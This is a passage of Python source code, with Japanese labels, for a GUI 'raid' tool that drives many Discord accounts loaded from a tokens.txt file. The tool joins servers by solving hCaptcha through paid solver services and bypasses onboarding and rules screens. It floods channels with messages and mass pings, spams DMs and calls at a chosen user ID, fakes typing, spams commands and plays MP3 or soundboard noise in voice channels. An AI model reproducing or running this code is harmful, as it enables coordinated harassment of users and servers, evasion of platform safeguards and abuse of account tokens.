    create_tab_button(tab_buttons_inner_frame, "Nick Changer", lambda: switch_tab(change_global_name_ui))
    create_tab_button(tab_buttons_inner_frame, "Avatar Changer", lambda: switch_tab(avatar_changer_ui))
    create_tab_button(tab_buttons_inner_frame, "MassDM", lambda: switch_tab(open_dm_spam_tab))
    create_tab_button(tab_buttons_inner_frame, "Call Spammer", lambda: switch_tab(call_spammer_tab))
    create_tab_button(tab_buttons_inner_frame, "VC Joiner and Spammer", lambda: switch_tab(vc_joiner_ui))
    create_tab_button(tab_buttons_inner_frame, "Onboarding Bypass", lambda: switch_tab(onboarding_bypass_tab))
    create_tab_button(tab_buttons_inner_frame, "Bio Changer", lambda: switch_tab(bio_changer_ui))
    create_tab_button(tab_buttons_inner_frame, "Auto Oauth2", lambda: switch_tab(auto_oauth2_tab))
    create_tab_button(tab_buttons_inner_frame, "Rule Bypass", lambda: switch_tab(rule_bypass_ui))
    create_tab_button(tab_buttons_inner_frame, "Button pusher", lambda: switch_tab(button_pusher_ui))
    create_tab_button(tab_buttons_inner_frame, "Thread Spammer", lambda: switch_tab(thread_spam_ui))
    create_tab_button(tab_buttons_inner_frame, "Forum Creator", lambda: switch_tab(forum_spammer_tab))
    create_tab_button(tab_buttons_inner_frame, "Info", lambda: switch_tab(info))

    global content_frame
    content_frame = ctk.CTkFrame(root)
    content_frame.pack(side="right", fill="both", expand=True)

    switch_tab(info)

def create_tab_button(parent, text, command):
    button = ctk.CTkButton(parent, text=text, command=command, width=150)
    button.pack(pady=5, padx=5)

def switch_tab(tab_function):
    for widget in content_frame.winfo_children():
        widget.destroy()

    tab_function(content_frame)

def boost_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    guild_label = ctk.CTkLabel(frame, text="Guild ID")
    guild_label.pack(pady=5)
    guild_entry = ctk.CTkEntry(frame)
    guild_entry.pack(pady=5)

    boost_label = ctk.CTkLabel(frame, text="Boost Count")
    boost_label.pack(pady=5)
    boost_entry = ctk.CTkEntry(frame)
    boost_entry.pack(pady=5)

    boost_button = ctk.CTkButton(frame, text="ブースト開始", command=lambda: threading.Thread(target=start_boosting, args=(guild_entry.get(), boost_entry.get())).start())
    boost_button.pack(pady=20)

def start_boosting(guild_id, boost_count):
    try:
        guild_id = int(guild_id)
        boost_count = int(boost_count)
        
        if guild_id <= 0 or boost_count <= 0:
            print("無効なギルドIDまたはブースト回数です。")
            return
        
        print(f"ギルドID: {guild_id}, ブースト回数: {boost_count} を処理中...")
        boost_with_multiple_tokens(guild_id, boost_count)
    
    except ValueError:
        print("ギルドIDとブースト回数は数字で入力してください。")

def read_key_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            key = file.read().strip()
        return key
    except IOError as e:
        tkinter.messagebox.showerror("File Error", str(e))
        return None

def write_key_to_file(file_path, key):
    try:
        with open(file_path, 'w') as file:
            file.write(key)
        print("キーを自動保存しました。")
    except IOError as e:
        tkinter.messagebox.showerror("File Error", str(e))
        print(f"ファイルへの書き込みエラー: {str(e)}")

def switch_to_main_ui():
    for widget in root.winfo_children():
        widget.destroy()
    setup_main_ui()

def joiner_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    invite_label = ctk.CTkLabel(frame, text="招待リンク")
    invite_label.pack(pady=5)

    invite_entry = ctk.CTkEntry(frame, width=250)
    invite_entry.pack(pady=5)

    use_captcha_var = ctk.BooleanVar()
    use_captcha_checkbox = ctk.CTkCheckBox(frame, text="hcap solverサービスを使う", variable=use_captcha_var)
    use_captcha_checkbox.pack(pady=5)

    captcha_service_var = ctk.StringVar(value="capsolver")
    captcha_service_label = ctk.CTkLabel(frame, text="CAPTCHAサービス")
    captcha_service_label.pack(pady=5)
    captcha_service_menu = ctk.CTkOptionMenu(frame, values=["CapSolver", "2Captcha"], variable=captcha_service_var)
    captcha_service_menu.pack(pady=5)

    delay_label = ctk.CTkLabel(frame, text="参加間隔（秒）")
    delay_label.pack(pady=5)
    delay_entry = ctk.CTkEntry(frame, width=100, placeholder_text="例: 0.1")
    delay_entry.pack(pady=5)
    delay_entry.insert(0, "0.05")

    def start_joining():
        invite = invite_entry.get()
        tokens = read_tokens('tokens.txt')
        invite_code = extract_invite_code(invite)
        use_captcha = use_captcha_var.get()
        captcha_service = "2captcha" if captcha_service_var.get() == "2Captcha" else "capsolver"
        
        try:
            delay = float(delay_entry.get())
            if delay < 0:
                raise ValueError("ディレイは0以上の値にしてください")
        except ValueError as e:
            tkinter.messagebox.showwarning("Error", f"正しいディレイ値を入力してください: {e}")
            return

        if invite_code:
            def process_tokens():
                try:
                    threads = []
                    for token in tokens:
                        thread = threading.Thread(target=joiner, args=(token, invite_code, use_captcha, captcha_service, delay))
                        threads.append(thread)
                        thread.start()
                        time.sleep(delay)
                    for thread in threads:
                        thread.join()
                except Exception as e:
                    print(f"Error processing tokens: {e}")

            thread = threading.Thread(target=process_tokens)
            thread.start()
        else:
            tkinter.messagebox.showwarning("Error", "正しくない招待リンク")

    join_button = ctk.CTkButton(frame, text="参加", command=start_joining)
    join_button.pack(pady=20)
    
def read_tokens(file_path):
    with open(file_path, "r") as f:
        tokens = f.read().splitlines()

    return tokens

def onboard_bypass(guild_id, tokens):
    onboarding_responses_seen = {}
    onboarding_prompts_seen = {}
    onboarding_responses = []
    in_guild = []
    cookie = get_discord_cookies()

    try:
        for token in tokens:
            response = session.get(
                f"https://discord.com/api/v9/guilds/{guild_id}/onboarding",
                headers=headers(token, cookie)
            )
            if response.status_code == 200:
                in_guild.append(token)
                break

        if not in_guild:
            hide_token = token[:25].rstrip() + '#'
            print(f"失敗[このtokenはサーバーに入っていません。| {hide_token}")
            return

        data = response.json()
        now = int(datetime.now().timestamp())

        for prompt in data.get("prompts", []):
            onboarding_responses.append(prompt["options"][-1]["id"])
            onboarding_prompts_seen[prompt["id"]] = now

            for option in prompt["options"]:
                if option:
                    onboarding_responses_seen[option["id"]] = now

        def run_task(token):
            try:
                json_data = {
                    "onboarding_responses": onboarding_responses,
                    "onboarding_prompts_seen": onboarding_prompts_seen,
                    "onboarding_responses_seen": onboarding_responses_seen,
                }

                response = session.post(
                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
                    headers=headers(token, cookie),
                    json=json_data
                )
                hide_token = token[:25].rstrip() + '*'
                if response.status_code == 200:
                    print(f"成功: {hide_token}")
                else:
                    print(f"失敗: {hide_token} - {response.json().get('message')}")
            except Exception as e:
                print(f"失敗: {hide_token} - {e}")

        threads = []
        for token in tokens:
            thread = threading.Thread(target=run_task, args=(token,))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    except Exception as e:
        print(f"オンボード回避に失敗。{e}")

def start_onboarding_bypass(guild_id):
    with open("tokens.txt", "r") as f:
        tokens = f.read().splitlines()
    onboard_bypass(guild_id, tokens)

def bio_changer(token, bio):
    cookie = get_discord_cookies()
    payload = {
        "bio": bio
    }
    while True:
        try:
            response = session.patch(
                "https://discord.com/api/v9/users/@me/profile",
                headers=headers(token, cookie),
                json=payload
            )

            if response.status_code == 200:
                print(f"Changed bio to: {bio}")
                return f"Bio changed for token: {token}"
            elif response.status_code == 429:
                retry_after = response.json().get("retry_after", 0)
                print(f"Rate limit exceeded - retrying in {retry_after}s")
                time.sleep(float(retry_after))
            else:
                error_message = response.json().get('message', 'Unknown error')
                print(f"Failed to change bio: {response.status_code} - {error_message}")
                return f"Failed to change bio for token {token}: {response.status_code} - {error_message}"
        except Exception as e:
            print(f"An error occurred: {e}")
            return f"An error occurred for token {token}: {e}"

def leaver_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    server_label = ctk.CTkLabel(frame, text="Guild IDを貼ってください。")
    server_label.pack(pady=5)
    server_entry = ctk.CTkEntry(frame)
    server_entry.pack(pady=5)
    leave_button = ctk.CTkButton(frame, text="退出", command=lambda: threading.Thread(target=leaver, args=(server_entry.get(),)).start())
    leave_button.pack(pady=20)

def stop_spammerOLD():
    global spammingOLD
    spammingOLD = False

def spammerOLD_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    channel_label = ctk.CTkLabel(frame, text="ChannelIDを貼ってください。")
    channel_label.pack(pady=5)
    channel_entry = ctk.CTkEntry(frame)
    channel_entry.pack(pady=5)
    message_label = ctk.CTkLabel(frame, text="スパムするメッセージ")
    message_label.pack(pady=5)
    message_entry = ctk.CTkTextbox(frame, width=500, height=250)
    message_entry.pack(pady=5)
    spam_button = ctk.CTkButton(frame, text="Start", command=lambda: threading.Thread(target=spammerOLD, args=(channel_entry.get(), message_entry.get("1.0", "end-1c"))).start())
    spam_button.pack(pady=5)
    stop_button = ctk.CTkButton(frame, text="Stop", command=stop_spammerOLD)
    stop_button.pack(pady=5)

def check_tokens_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    check_button = ctk.CTkButton(frame, text="Tokenチェック", command=start_checking_tokens)
    check_button.pack(pady=20)

def start_checking_tokens():
    global tokens
    tokens = read_tokens('tokens.txt')
    thread = threading.Thread(target=check_and_remove_invalid_tokens)
    thread.start()

def reaction_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    channel_label = ctk.CTkLabel(frame, text="ChannelID")
    channel_label.pack(pady=5)
    channel_entry = ctk.CTkEntry(frame)
    channel_entry.pack(pady=5)
    message_label = ctk.CTkLabel(frame, text="メッセージID")
    message_label.pack(pady=5)
    message_entry = ctk.CTkEntry(frame)
    message_entry.pack(pady=5)
    emoji_label = ctk.CTkLabel(frame, text="リアクションする絵文字")
    emoji_label.pack(pady=5)
    emoji_entry = ctk.CTkEntry(frame)
    emoji_entry.pack(pady=5)
    react_button = ctk.CTkButton(frame, text="リアクション", command=lambda: threading.Thread(target=react_to_message, args=(channel_entry.get(), message_entry.get(), emoji_entry.get())).start())
    react_button.pack(pady=20)

def fake_typer_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    
    channel_label = ctk.CTkLabel(frame, text="ChannelIDを入力してください:")
    channel_label.pack(pady=5)
    
    channel_entry = ctk.CTkEntry(frame, width=250)
    channel_entry.pack(pady=5)
    
    def start_fake_typers():
        global threads
        global stop_event

        channel_id = channel_entry.get().strip()
        if not channel_id:
            tkinter.messagebox.showerror("エラー", "Channel IDを入力してください。")
            return
        stop_event.clear()
        for token in tokens:
            thread = threading.Thread(target=fake_typer, args=(channel_id, token))
            threads.append(thread)
            thread.start()
    
    def stop_fake_typers():
        global threads
        global stop_event

        stop_event.set()
        for thread in threads:
            thread.join() 
        threads = []
        print("Fake Typerを止めました")

    fake_typer_button = ctk.CTkButton(frame, text="Fake Typer開始", command=start_fake_typers)
    fake_typer_button.pack(pady=5)

    stop_button = ctk.CTkButton(frame, text="停止", command=stop_fake_typers)
    stop_button.pack(pady=5)

def all_channel_spam_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    server_label = ctk.CTkLabel(frame, text="Guild ID")
    server_label.pack(pady=5)
    server_entry = ctk.CTkEntry(frame, width=400)
    server_entry.pack(pady=5)

    message_label = ctk.CTkLabel(frame, text="メッセージ")
    message_label.pack(pady=5)
    message_entry = ctk.CTkTextbox(frame, width=500, height=200)
    message_entry.pack(pady=5)

    mass_ping_var = ctk.BooleanVar(value=False)
    mass_ping_check = ctk.CTkCheckBox(frame, text="Mass Pingを有効にする", variable=mass_ping_var)
    mass_ping_check.pack(pady=5)

    ping_count_label = ctk.CTkLabel(frame, text="メンション数 (1-10)")
    ping_count_label.pack(pady=5)
    ping_count_entry = ctk.CTkEntry(frame, width=100)
    ping_count_entry.insert(0, "3")
    ping_count_entry.pack(pady=5)

    random_string_var = ctk.BooleanVar(value=False)
    random_string_check = ctk.CTkCheckBox(frame, text="ランダム文字列を追加", variable=random_string_var)
    random_string_check.pack(pady=5)

    messages_per_second_label = ctk.CTkLabel(frame, text="1トークンあたりのメッセージ/秒 (0.1-20.0)")
    messages_per_second_label.pack(pady=5)
    warning_label = ctk.CTkLabel(frame, text="警告: 10メッセージ/秒以上はレートリミットのリスクが高く、推奨しません。", text_color="yellow")
    warning_label.pack(pady=0)
    messages_per_second_entry = ctk.CTkEntry(frame, width=100)
    messages_per_second_entry.insert(0, "1.0")
    messages_per_second_entry.pack(pady=5)

    def start_spamming():
        server_id = server_entry.get().strip()
        message = message_entry.get("1.0", "end-1c").strip()
        mass_ping = mass_ping_var.get()
        random_string = random_string_var.get()
        try:
            ping_count = int(ping_count_entry.get() or 0)
            if ping_count < 1 or ping_count > 10:
                tkinter.messagebox.showerror("エラー", "メンション数は1～10の範囲で指定してください。")
                return
            messages_per_second = float(messages_per_second_entry.get() or 1.0)
            if messages_per_second < 0.1 or messages_per_second > 50.0:
                tkinter.messagebox.showerror("エラー", "メッセージ/秒は0.1～50.0の範囲で指定してください。")
                return
        except ValueError:
            tkinter.messagebox.showerror("エラー", "メンション数とメッセージ/秒は数値で入力してください。")
            return

        if not server_id:
            tkinter.messagebox.showerror("エラー", "Guild IDを入力してください。")
            return
        if not message:
            tkinter.messagebox.showerror("エラー", "メッセージを入力してください。")
            return

        threading.Thread(
            target=all_channel_spam,
            args=(server_id, message, mass_ping, ping_count, random_string, messages_per_second),
            daemon=True
        ).start()

    all_spam_button = ctk.CTkButton(frame, text="Start", command=start_spamming)
    all_spam_button.pack(pady=5)

    all_spam_stop_button = ctk.CTkButton(frame, text="Stop", command=lambda: globals().update(stop_spammer=True))
    all_spam_stop_button.pack(pady=5)

def text_random_spam_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    channel_label = ctk.CTkLabel(frame, text="ChannelID")
    channel_label.pack(pady=5)
    channel_entry = ctk.CTkEntry(frame)
    channel_entry.pack(pady=5)
    text_spam_button = ctk.CTkButton(frame, text="Start", command=lambda: threading.Thread(target=custom_spammer, args=(channel_entry.get(),)).start())
    text_spam_button.pack(pady=20)
    stop_text_spam_button = ctk.CTkButton(frame, text="Stop", command=lambda: threading.Thread(target=stop_custom_spammer, args=(channel_entry.get(),)).start())
    stop_text_spam_button.pack(pady=0)

def bot_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    channel_label = ctk.CTkLabel(frame, text="ChannelID")
    channel_label.pack(pady=5)
    channel_entry = ctk.CTkEntry(frame)
    channel_entry.pack(pady=5)
    bot_button = ctk.CTkButton(frame, text="Start", command=lambda: howbot(channel_entry.get()))
    bot_button.pack(pady=20)

def onliner_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    onliner_button = ctk.CTkButton(frame, text="Onliner", command=lambda: threading.Thread(target=change_status_wrapper()).start())
    onliner_button.pack(pady=20)

def change_status_wrapper():
    tokens = read_tokens('tokens.txt')
    for token in tokens:
        threading.Thread(target=change_status, args=(token,)).start()

def stop_spammer():
    global spamming
    spamming = False

def new_spammer_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    channel_label = ctk.CTkLabel(frame, text="Channel ID")
    channel_label.pack(pady=0)
    channel_entry = ctk.CTkEntry(frame, width=400)
    channel_entry.pack(pady=0)

    guild_label = ctk.CTkLabel(frame, text="Guild ID (Mass pingを使う場合は必要)")
    guild_label.pack(pady=0)
    guild_entry = ctk.CTkEntry(frame, width=400)
    guild_entry.pack(pady=0)

    message_label = ctk.CTkLabel(frame, text="メッセージ")
    message_label.pack(pady=0)
    message_entry = ctk.CTkTextbox(frame, width=500, height=200)
    message_entry.pack(pady=0)

    mass_ping_var = ctk.BooleanVar(value=False)
    mass_ping_check = ctk.CTkCheckBox(frame, text="Mass Pingを有効にする", variable=mass_ping_var)
    mass_ping_check.pack(pady=0)

    ping_count_label = ctk.CTkLabel(frame, text="メンション数 (1-10)")
    ping_count_label.pack(pady=0)
    ping_count_entry = ctk.CTkEntry(frame, width=100)
    ping_count_entry.insert(0, "3")
    ping_count_entry.pack(pady=0)

    random_string_var = ctk.BooleanVar(value=False)
    random_string_check = ctk.CTkCheckBox(frame, text="ランダム文字列を追加", variable=random_string_var)
    random_string_check.pack(pady=0)

    messages_per_second_label = ctk.CTkLabel(frame, text="1トークンあたりの1秒間に送るメッセージ数 (0.1～20)")
    messages_per_second_label.pack(pady=0)
    warning_label = ctk.CTkLabel(frame, text="警告: 10メッセージ/秒以上はレートリミットのリスクが高く、推奨しません。", text_color="yellow")
    warning_label.pack(pady=0)
    messages_per_second_entry = ctk.CTkEntry(frame, width=100)
    messages_per_second_entry.insert(0, "1.0")
    messages_per_second_entry.pack(pady=0)

    turbo_mode_var = ctk.BooleanVar(value=False)
    turbo_mode_check = ctk.CTkCheckBox(frame, text="自動設定(簡単に速い速度に設定)", variable=turbo_mode_var)
    turbo_mode_check.pack(pady=0)

    cycle_interval_label = ctk.CTkLabel(frame, text="トークンサイクル間隔（秒, 0.01-1.0, 自動設定では無視）")
    cycle_interval_label.pack(pady=0)
    cycle_interval_entry = ctk.CTkEntry(frame, width=100)
    cycle_interval_entry.insert(0, "0.1")
    cycle_interval_entry.pack(pady=0)
    def start_spamming():
        try:
            messages_per_second = float(messages_per_second_entry.get() or 1.0)
            if messages_per_second < 0.1 or messages_per_second > 20.0:
                tkinter.messagebox.showerror("エラー", "メッセージ/秒は0.1～20.0の範囲で指定してください。")
                return
            ping_count = int(ping_count_entry.get() or 0)
            if ping_count < 1 or ping_count > 10:
                tkinter.messagebox.showerror("エラー", "メンション数は1～10の範囲で指定してください。")
                return
            cycle_interval = float(cycle_interval_entry.get() or 0.1)
            if cycle_interval < 0.01 or cycle_interval > 1.0:
                tkinter.messagebox.showerror("エラー", "トークンサイクル間隔は0.01～1.0の範囲で指定してください。")
                return
        except ValueError:
            tkinter.messagebox.showerror("エラー", "メッセージ/秒、メンション数、サイクル間隔は数値で入力してください。")
            return

        threading.Thread(target=spammer, args=(
            channel_entry.get(),
            message_entry.get("1.0", "end-1c"),
            guild_entry.get(),
            mass_ping_var.get(),
            ping_count,
            random_string_var.get(),
            messages_per_second,
            turbo_mode_var.get(),
            cycle_interval
        )).start()

    start_button = ctk.CTkButton(frame, text="Start", command=start_spamming)
    start_button.pack(pady=5)

    stop_button = ctk.CTkButton(frame, text="Stop", command=lambda: globals().update(spamming=False))
    stop_button.pack(pady=5)

def command_spammer_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    # Channel Link
    channel_label = ctk.CTkLabel(frame, text="Channel Link (e.g., https://discord.com/channels/guild_id/channel_id)")
    channel_label.pack(pady=5)
    channel_entry = ctk.CTkEntry(frame, width=400)
    channel_entry.pack(pady=5)

    command_label = ctk.CTkLabel(frame, text="Command (e.g., /command subcommand)")
    command_label.pack(pady=5)
    command_entry = ctk.CTkEntry(frame, width=400)
    command_entry.pack(pady=5)
    def start_spamming():
        channel_link = channel_entry.get().strip()
        main_command = command_entry.get().strip()

        if not channel_link or not main_command:
            tkinter.messagebox.showerror("エラー", "Channel LinkとCommandを入力してください。")
            return

        # トークンの読み込み
        tokens = read_tokens('tokens.txt')
        if not tokens:
            tkinter.messagebox.showerror("エラー", "トークンが読み込めませんでした。")
            return

        # スパム処理を別スレッドで実行
        threading.Thread(
            target=process_command_spammer,
            args=(tokens, channel_link, main_command),
            daemon=True
        ).start()

    start_button = ctk.CTkButton(frame, text="Start", command=start_spamming)
    start_button.pack(pady=5)

    # Stopボタン
    stop_button = ctk.CTkButton(frame, text="Stop", command=stop_spammer)
    stop_button.pack(pady=5)
    
def change_global_name_ui(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    
    name_label = ctk.CTkLabel(frame, text="ユーザー名チェンジャー (nick.txtからランダムに)")
    name_label.pack(pady=5)
    
    def start_name_changer():
        with open("tokens.txt", "r", encoding="utf-8") as token_file:
            tokens = token_file.read().splitlines()
        
        try:
            with open("nick.txt", "r", encoding="utf-8") as nick_file:
                names = nick_file.read().splitlines()
        except UnicodeDecodeError:
            print("nick.txtが読み取れません。")
            return
        
        for token in tokens:
            random_name = random.choice(names)
            threading.Thread(target=change_global_name, args=(token, random_name)).start()
    
    change_name_button = ctk.CTkButton(frame, text="表示名を変更", command=start_name_changer)
    change_name_button.pack(pady=20)

def info(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    Loaded_Tokenlabel = ctk.CTkLabel(frame, text=f"読み込まれたtoken {token_count}個")
    Loaded_Tokenlabel.pack(pady=5)
    label1 = ctk.CTkLabel(frame, text="Ver - Public 3.0")
    label1.pack(pady=5)
    label2 = ctk.CTkLabel(frame, text="Note - 自由に書いて、どうぞ。")
    label2.pack(pady=5)
    label3 = ctk.CTkLabel(frame, text="Update1 - 全チャンネルスパムにmasspingを追加")
    label3.pack(pady=5)
    label4 = ctk.CTkLabel(frame, text="Update2 - コマンドスパム機能を追加(こてつさん作)")
    label4.pack(pady=5)
    label4 = ctk.CTkLabel(frame, text="Update3 - MassDMとは別に、超高性能なcallspam機能を追加(こてつさん作)")
    label4.pack(pady=5)

def open_dm_spam_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    warn_label = ctk.CTkLabel(frame, text="このオプションはtokenの寿命を非常に削ります。注意して使用してください。")
    warn_label.pack(pady=5)
    user_id_label = ctk.CTkLabel(frame, text="User ID")
    user_id_label.pack(pady=5)
    user_id_entry = ctk.CTkEntry(frame, width=200)
    user_id_entry.pack(pady=5)

    message_label = ctk.CTkLabel(frame, text="メッセージ")
    message_label.pack(pady=5)
    message_entry = ctk.CTkTextbox(frame, width=400, height=150)
    message_entry.pack(pady=5)

    dm_spam_var = ctk.IntVar()
    call_spam_var = ctk.IntVar()

    dm_spam_checkbox = ctk.CTkCheckBox(frame, text="DM Spam", variable=dm_spam_var)
    dm_spam_checkbox.pack(pady=5)

    call_spam_checkbox = ctk.CTkCheckBox(frame, text="Call Spam", variable=call_spam_var)
    call_spam_checkbox.pack(pady=5)

    def start_spamming():
        global stop_spamming
        stop_spamming = False
        user_id = user_id_entry.get().strip()
        message = message_entry.get("1.0", "end-1c").strip()
        dm_spam = dm_spam_var.get()
        call_spam = call_spam_var.get()

        if not user_id:
            tkinter.messagebox.showwarning("Error", "ユーザーIDが指定されていません。")
            return

        if not dm_spam and not call_spam:
            tkinter.messagebox.showwarning("Error", "どちらか選択してください。")
            return
        
        tokens = read_tokens('tokens.txt')

        for token in tokens:
            thread = threading.Thread(target=open_dm_and_spam, args=(user_id, message, dm_spam, call_spam, token))
            thread.start()

    def stop_spamming_fn():
        global stop_spamming
        stop_spamming = True

    spam_button = ctk.CTkButton(frame, text="Start", command=start_spamming)
    spam_button.pack(pady=10)

    stop_button = ctk.CTkButton(frame, text="Stop", command=stop_spamming_fn)
    stop_button.pack(pady=10)

def start_vc_joining(tokens, guild, channel):
    threads = []
    for token in tokens:
        thread = threading.Thread(target=vc_joiner, args=(token, guild, channel))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def has_voice_permissions(token, guild_id, channel_id):
    try:
        headers = {"Authorization": token}
        response = requests.get(
            f"https://discord.com/api/v9/users/@me/guilds",
            headers=headers
        )
        if response.status_code != 200:
            print(f"Failed to check guild membership: {response.status_code} {response.text}")
            return False
        guilds = response.json()
        if not any(guild["id"] == guild_id for guild in guilds):
            print(f"Token {token[:25]}... is not a member of guild {guild_id}")
            return False

        response = requests.get(
            f"https://discord.com/api/v9/channels/{channel_id}",
            headers=headers
        )
        if response.status_code == 200:
            permissions = int(response.json().get("permissions", 0))
            if (permissions & 0x00000010) == 0:
                print(f"Token {token[:25]}... lacks CONNECT permission for channel {channel_id}")
                return False
            return True
        print(f"Failed to check permissions: {response.status_code} {response.text}")
        return False
    except Exception as e:
        print(f"Error checking voice permissions for token {token[:25]}...: {e}")
        return False

def play_mp3_in_vc(token, guild_id, channel_id, mp3_path):
    try:
        if not is_token_valid(token):
            raise ValueError(f"Invalid or locked token: {token[:25]}...")
        if not has_voice_permissions(token, guild_id, channel_id):
            raise ValueError(f"Token {token[:25]}... lacks CONNECT permission for channel {channel_id}")
        if not os.path.exists(mp3_path):
            raise FileNotFoundError(f"MP3 file {mp3_path} does not exist")

        max_reconnects = 3
        reconnect_attempts = 0
        ws = None
        udp_socket = None
        stop_heartbeat = threading.Event()

        while reconnect_attempts < max_reconnects:
            try:
                ws = websocket.WebSocket()
                ws.connect("wss://gateway.discord.gg/?v=9&encoding=json", timeout=10)

                session_id, heartbeat_thread = vc_joiner(token, guild_id, channel_id, ws, stop_heartbeat)
                user_id = get_user_id_from_token(token)
                if not user_id:
                    raise Exception("Failed to get user ID")

                ws.send(json.dumps({
                    "op": 0,
                    "d": {
                        "server_id": guild_id,
                        "user_id": user_id,
                        "session_id": session_id,
                        "token": token
                    }
                }))

                voice_server = None
                voice_token = None
                endpoint = None
                max_retries = 5
                retries = 0
                while retries < max_retries:
                    response_data = ws.recv()
                    if not response_data:
                        retries += 1
                        time.sleep(1)
                        continue
                    response = json.loads(response_data)
                    if response.get("op") == 8:
                        voice_server = response["d"]
                        voice_token = voice_server["token"]
                        endpoint = voice_server["endpoint"]
                        break
                    retries = 0

                if not voice_server:
                    raise Exception(f"Failed to receive voice server update after {max_retries} retries")

                udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                voice_ip = endpoint.split(":")[0]
                voice_port = int(endpoint.split(":")[1]) if ":" in endpoint else 443
                ssrc = random.randint(1000, 9999)

                discovery_packet = struct.pack(">I70s", ssrc, b"\x00" * 70)
                udp_socket.sendto(discovery_packet, (voice_ip, voice_port))
                response, _ = udp_socket.recvfrom(74)
                _, ip, port = struct.unpack(">I70sH", response)
                ip = ip.rstrip(b"\x00").decode()

                ws.send(json.dumps({
                    "op": 1,
                    "d": {
                        "protocol": "udp",
                        "data": {
                            "address": ip,
                            "port": port,
                            "mode": "xsalsa20_poly1305"
                        }
                    }
                }))

                secret_key = None
                retries = 0
                while retries < max_retries:
                    response_data = ws.recv()
                    if not response_data:
                        retries += 1
                        time.sleep(1)
                        continue
                    response = json.loads(response_data)
                    if response.get("op") == 2:
                        secret_key = bytes(response["d"]["secret_key"])
                        break
                    retries = 0

                if not secret_key:
                    raise Exception(f"Failed to receive session description after {max_retries} retries")

                frame_size = 960
                sample_rate = 48000
                channels = 2
                process = (
                    ffmpeg.input(mp3_path)
                    .output(
                        'pipe:',
                        format='opus',
                        ac=channels,
                        ar=sample_rate,
                        frame_size=20,
                        segment_time=0.02,
                        segment_format='opus'
                    )
                    .run_async(pipe_stdout=True, pipe_stderr=True)
                )

                sequence = 0
                timestamp = 0
                nonce = 0
                stdout = process.stdout
                while True:
                    opus_data = stdout.read(1024)
                    if not opus_data:
                        break
                    header = struct.pack(">BBHII", 0x80, 0x78, sequence, timestamp, ssrc)
                    nonce_bytes = struct.pack(">I", nonce) + b"\x00" * 8
                    secret_box = nacl.secret.SecretBox(secret_key)
                    encrypted = secret_box.encrypt(opus_data, nonce_bytes).ciphertext
                    packet = header + encrypted
                    udp_socket.sendto(packet, (voice_ip, voice_port))
                    sequence += 1
                    timestamp += frame_size
                    nonce += 1
                    time.sleep(0.02)

                process.wait()

                ws.send(json.dumps({
                    "op": 4,
                    "d": {
                        "guild_id": guild_id,
                        "channel_id": None,
                        "self_mute": False,
                        "self_deaf": False
                    }
                }))
                break

            except Exception as e:
                reconnect_attempts += 1
                print(f"Error, attempt {reconnect_attempts}/{max_reconnects}: {e}")
                if reconnect_attempts < max_reconnects:
                    time.sleep(2 ** reconnect_attempts)
                continue
            finally:
                stop_heartbeat.set()
                if ws and ws.sock and ws.sock.connected:
                    ws.close()
                if udp_socket:
                    udp_socket.close()

        if reconnect_attempts >= max_reconnects:
            raise Exception(f"Failed after {max_reconnects} reconnect attempts")

        print(f"Finished playing MP3 with token {token[:25]}...")

    except Exception as e:
        print(f"Failed to play MP3 with token {token[:25]}...: {e}")
        raise

def start_mp3_spam(link, mp3_path):
    if not link.startswith("https://discord.com/channels/"):
        print("Invalid channel link")
        return
    channel_id = link.split("/")[5]
    guild_id = link.split("/")[4]
    if not os.path.exists(mp3_path):
        print(f"MP3 file {mp3_path} does not exist")
        return
    with open("tokens.txt", "r") as f:
        tokens = [t.strip() for t in f.readlines() if t.strip()]
    if not tokens:
        print("No tokens found")
        return
    max_concurrent = 5
    threads = []
    for token in tokens:
        thread = threading.Thread(target=play_mp3_in_vc, args=(token, guild_id, channel_id, mp3_path))
        threads.append(thread)
        thread.start()
        time.sleep(2.0)
        while sum(1 for t in threads if t.is_alive()) >= max_concurrent:
            time.sleep(0.5)
    for thread in threads:
        thread.join()

def start_soundboard_spam(link):
    if not link.startswith("https://discord.com/channels/"):
        print("Invalid channel link")
        return

    channel_id = link.split("/")[5]
    guild_id = link.split("/")[4]

    with open("tokens.txt", "r") as f:
        tokens = f.read().splitlines()

    threads = []
    for token in tokens:
        thread = threading.Thread(target=vc_joiner, args=(token, guild_id, channel_id))
        threads.append(thread)
        thread.start()

        thread = threading.Thread(target=soundboard, args=(token, channel_id))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def vc_joiner_ui(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    link_label = ctk.CTkLabel(frame, text="Channel Link (e.g., https://discord.com/channels/guild_id/channel_id)")
    link_label.pack(pady=10)
    link_entry = ctk.CTkEntry(frame, width=400)
    link_entry.pack(pady=10)

    mp3_label = ctk.CTkLabel(frame, text="MP3 File Path")
    mp3_label.pack(pady=10)
    mp3_entry = ctk.CTkEntry(frame, width=400)
    mp3_entry.pack(pady=10)

    def select_mp3_file():
        file_path = tkinter.filedialog.askopenfilename(filetypes=[("MP3 files", "*.mp3")])
        if file_path:
            mp3_entry.delete(0, "end")
            mp3_entry.insert(0, file_path)

    mp3_select_button = ctk.CTkButton(frame, text="Select MP3", command=select_mp3_file)
    mp3_select_button.pack(pady=5)

    start_soundboard_button = ctk.CTkButton(frame, text="Start Soundboard Spam", command=lambda: threading.Thread(target=start_soundboard_spam, args=(link_entry.get(),)).start())
